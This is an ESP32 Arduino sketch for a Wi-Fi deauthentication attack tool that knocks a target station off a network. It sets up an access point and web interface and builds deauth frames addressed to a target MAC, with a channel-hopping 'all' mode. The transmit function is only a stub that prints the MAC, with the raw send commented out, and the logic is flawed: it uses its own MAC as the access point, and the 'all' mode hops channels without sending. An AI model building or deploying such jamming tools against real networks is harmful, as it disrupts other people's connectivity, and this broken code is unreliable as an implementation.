#include <WiFi.h>
#include <esp_wifi.h>
#include "types.h"
#include "web_interface.h"
#include "deauth.h"
#include "definitions.h"

// Declare global variables
int curr_channel = 1;
int deauth_type = DEAUTH_TYPE_SINGLE;  // Default to single deauth type
uint8_t target_mac[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};  // Example target MAC address
uint8_t ap_mac[6];  // AP's MAC address

void setup() {
#ifdef SERIAL_DEBUG
  Serial.begin(115200);
#endif
#ifdef LED
  pinMode(LED, OUTPUT);
#endif

  // Start the AP (Access Point) mode
  WiFi.mode(WIFI_MODE_AP);
  WiFi.softAP(AP_SSID, AP_PASS);  // SSID and password for the AP

  // Get the MAC address of the access point (ESP32)
  esp_wifi_get_mac(WIFI_IF_AP, ap_mac);

  start_web_interface();  // Start the web interface to handle HTTP requests
}

void send_deauth() {
  deauth_frame_t deauth_frame;

  // Populate deauth_frame with the required values
  memcpy(deauth_frame.sender, ap_mac, 6);      // AP MAC address
  memcpy(deauth_frame.access_point, ap_mac, 6); // AP MAC address
  memcpy(deauth_frame.station, target_mac, 6);  // Target station MAC address
  deauth_frame.reason = 0x0001;  // Example reason code (Deauth reason 1)

  // Send the deauth frame (assumed you have a function send_deauth_frame())
  send_deauth_frame(deauth_frame);
  
  // Blink LED to indicate deauth action
  BLINK_LED(DEAUTH_BLINK_TIMES, DEAUTH_BLINK_DURATION);
}

void loop() {
  // If deauth_type is set to DEAUTH_TYPE_ALL, cycle through channels
  if (deauth_type == DEAUTH_TYPE_ALL) {
    if (curr_channel > CHANNEL_MAX) curr_channel = 1;  // Reset to channel 1 if over max
    esp_wifi_set_channel(curr_channel, WIFI_SECOND_CHAN_NONE);  // Change to the next channel
    curr_channel++;  // Increment to next channel
    delay(10);  // Wait for 10 ms before moving to the next channel
  } else {
    web_interface_handle_client();  // If not DEAUTH_TYPE_ALL, handle web interface client requests
  }

  // If deauth_type is SINGLE, send a deauth frame every loop cycle
  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    send_deauth();
    delay(1000);  // Delay to prevent flooding the network
  }
}

void send_deauth_frame(deauth_frame_t deauth_frame) {
  // This function would contain the logic for sending the deauthentication frame over the network.
  // You would likely use the Wi-Fi library to send the raw frame (deauth_frame) to the target MAC address.
  // Example code here:
  // wifi_send_raw_frame((uint8_t *)&deauth_frame, sizeof(deauth_frame));
  DEBUG_PRINTF("Sending deauth frame to MAC: ");
  for (int i = 0; i < 6; i++) {
    DEBUG_PRINTF("%02X ", deauth_frame.station[i]);
  }
  DEBUG_PRINTLN();
}
